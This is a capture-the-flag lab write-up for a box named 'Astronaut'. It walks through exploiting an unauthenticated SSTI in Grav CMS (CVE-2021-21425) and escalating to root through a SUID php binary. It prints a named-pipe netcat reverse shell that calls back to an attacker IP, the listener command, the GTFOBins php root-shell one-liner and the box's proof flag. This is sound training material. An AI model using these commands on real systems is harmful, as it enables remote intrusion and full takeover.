---
title: "Astronaut - Writeup"
linkTitle: "Astronaut"
weight: 13
featured: true
platform: "PG"
name: "Astronaut"
os: "Linux"
difficulty: "Easy"
release: "07 Jul 2026"
ip: "192.168.63.12"
# Drop a real avatar at static/img/pg/astronaut.png and uncomment:
# avatar: "/img/pg/astronaut.png"
tags: ["linux", "grav-cms", "cve-2021-21425", "ssti", "suid-php", "root-shell"]
description: "Easy Linux box. An unauthenticated SSTI in Grav CMS's admin plugin gives a shell, and a SUID PHP binary closes the gap to root."
---

{{< htb name="Astronaut" os="Linux" difficulty="Easy" release="07 Jul 2026" ip="192.168.63.12" platform="PG" >}}

## Reconnaissance

```
(root㉿kali)# nmap 192.168.63.12
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## Enumeration

The web root is a default **Grav CMS** install, with the admin panel sitting at the standard path.

![Grav CMS default installation page at /grav-admin/](/img/pg/astronaut/01-grav-cms-default.png)

Grav's admin plugin has an unauthenticated SSTI, [CVE-2021-21425](https://github.com/CsEnox/CVE-2021-21425), affecting installs left on their default Twig configuration.

## Initial Foothold

```
(root㉿kali)# python exploit.py -t http://192.168.63.12/grav-admin -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.49.63 9001 >/tmp/f'
```

```
(root㉿kali)# nc -lnvp 9001
```

```
listening on [any] 9001 ...
```

The exploit injects a Twig template expression that gets rendered server-side, and the named-pipe payload turns that into a full interactive shell back on the listener.

## Privilege Escalation

```
$ find / -user root -perm -4000 2>/dev/null
```

```
/usr/bin/mount
/usr/bin/php7.4
/usr/bin/gpasswd
```

`php7.4` carries the SUID bit. [GTFOBins](https://gtfobins.org/gtfobins/php/) documents a direct root shell through it.

```
$ php -r 'pcntl_exec("/bin/sh", ["-p"]);'
```

Root shell lands. Two files sit in `/root`.

```
cat /root/flag1.txt
```

```
T2Zmc2Vj
```

Base64-encoded, decodes to a short easter egg rather than a real flag.

```
(root㉿kali)# echo "T2Zmc2Vj" | base64 -d
```

```
Offsec
```

```
cat /root/proof.txt
```

```
fdc544e1d517f84108218a87ef1845db
```

## Lessons learned

- A default install page isn't just noise, it's a version fingerprint. Grav CMS's own welcome screen was enough to identify the exact product and go straight to its known admin-plugin CVE.
- Named pipes (`mkfifo`) are the standard way to turn a blind or one-shot command execution primitive into a real interactive shell. Know this pattern well enough to adapt it on the fly, not just copy it from a PoC.
- Check every SUID binary against GTFOBins by name, even common language runtimes like `php`. A single line from GTFOBins was the entire privilege escalation here.
